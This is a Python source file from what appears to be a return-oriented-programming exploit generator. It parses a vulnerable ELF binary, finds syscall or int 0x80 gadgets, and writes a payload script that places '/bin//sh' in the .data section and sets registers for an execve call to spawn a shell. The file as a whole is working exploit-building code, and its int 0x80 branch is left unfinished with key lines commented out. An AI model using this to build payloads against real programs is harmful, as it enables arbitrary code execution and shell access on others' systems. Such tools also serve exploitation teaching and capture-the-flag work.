from elftools.elf.elffile import ELFFile
import capstone
import struct
import sys

import general
import print_pretty
import categorize
import get_gadgets
import chain


# Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
# This is the driver routine which will chain the rop-gadgets and get execve shellcode
def execveROPChain(GadgetList, vulnExecutable): 

    print("\n\n-->Chaining to get a shell using execve system call")

    fd = open(vulnExecutable, "rb")
    elffile = ELFFile(fd)
    data_section = ".data"
    section = elffile.get_section_by_name(data_section)
    
    # We need .data section's details because we have to write "/bin//sh" into it. 
    data_section_addr = section["sh_addr"]
    data_section_size = section["sh_size"]

    syscallList1 = categorize.checkIfSyscallPresent(GadgetList)
    intList = categorize.checkIfIntPresent(GadgetList)
    syscallList2 = get_gadgets.getSyscallList()

    if len(intList) == 0 and len(syscallList1) == 0 and len(syscallList2) == 0: 
        print("No int 0x80, no syscall, no ROP")
        print("Exiting tool :(")
        sys.exit()
    
    # There are 2 choices here: 
    
    # Choice - 1
    # if syscall is found, 
        # rax <- 59
        # rdi <- Address of "/bin/sh"
        # rsi <- 0
        # rdx <- 0
        # syscall
    
    if len(syscallList1) > 0 or len(syscallList2) > 0: 
        case2(GadgetList, data_section_addr)
        sys.exit()

    # Choice - 2
    # if int 0x80 is found, 
        # rax <- 11
        # rbx <- Address of "/bin/sh"
        # rcx <- 0
        # rdx <- 0
        # int 0x80
    elif len(intList) > 0: 
        case1(GadgetList, data_section_addr)
        sys.exit()

    # Choice-1 is always the priority. 
    # Reason: We have observed that number of gadgets related to rdi, rsi are way more than gadgets related to rbx, rcx. 

    print("--> No syscall / int 0x80 found => ROP Chaining failed")
    sys.exit()



# If "int 0x80" instruction is found: 

# These are the steps to be followed. 
#
# 1. rax <- 11
# 2. Write "/bin//sh" into .data section
# 3. rbx <- .data section's address
# 4. rcx <- 0
# 5. rdx <- 0
# 6. Execute "int 0x80" instruction


def case1(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("execveROPChain.py", "w")
    chain.writeHeader(fd)
    
    # Step-2: Writing "/bin//sh" into .data section
    binsh = 0x68732f2f6e69622f
    binsh = struct.pack('<Q', binsh)
    chain.WriteStuffIntoMemory(binsh, data_section_addr, fd)
 
    # Step-1: rax <- 11
    chain.LoadConstIntoReg(GadgetList, "rax", 11, fd)

	# Step-3: rbx <- "Address of /bin//sh" - .data section's address
    chain.LoadConstIntoReg(GadgetList, "rbx", data_section_addr, fd)

	# Step-4: rcx <- 0
    chain.LoadConstIntoReg(GadgetList, "rcx", 0, fd)

    # Step-5: rdx <- 0
    chain.LoadConstIntoReg(GadgetList, "rdx", 0, fd)


    # Get int 0x80
    # Write the next few to lines to make this work.
    
    # syscallList = categorize.checkIfSyscallPresent(GadgetList)
    # syscallGadget = syscallList[0]
    
    # syscallDict = syscallGadget[0]
    # syscallAddress = syscallDict['address']
    
    # fd.write("payload += struct.pack('<Q', ")
    # fd.write(hex(int(syscallAddress)))
    # fd.write(")")
    # fd.write("\t\t# Address of syscall")
    # fd.write("\n\t")

    
    # chain.writeFooter(fd)
    # print("-->Written the complete payload in execveROPChain.py")
    # print("-->Chaining successful!")


# If "syscall" instruction is found: 

# These are the steps to be followed. 
#
# 1. rax <- 59
# 2. Write "/bin//sh" into .data section
# 3. rdi <- .data section's address
# 4. rsi <- 0
# 5. rdx <- 0
# 6. Execute "syscall" instruction

def case2(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("execveROPChain.py", "w")
    chain.writeHeader(fd)
    
    # Step-2: Writing "/bin//sh" into .data section
    binsh = 0x68732f2f6e69622f
    binsh = struct.pack('<Q', binsh)
    chain.WriteStuffIntoMemory(binsh, data_section_addr, fd)
 
    # Step-1: rax <- 59
    chain.LoadConstIntoReg(GadgetList, "rax", 59, fd)

	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
    chain.LoadConstIntoReg(GadgetList, "rdi", data_section_addr, fd)

	# Step-4: rsi <- 0
    chain.LoadConstIntoReg(GadgetList, "rsi", 0, fd)

    # Step-5: rdx <- 0
    chain.LoadConstIntoReg(GadgetList, "rdx", 0, fd)


    # Get syscall
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    if len(syscallList) == 0: 
        syscallList = get_gadgets.getSyscallList()
        syscallAddress = syscallList[0][0]
    
    else : 
        syscallGadget = syscallList[0]
        syscallDict = syscallGadget[0]
        syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    
    chain.writeFooter(fd)
    print("-->Written the complete payload in execveROPChain.py")
    print("-->Chaining successful!")
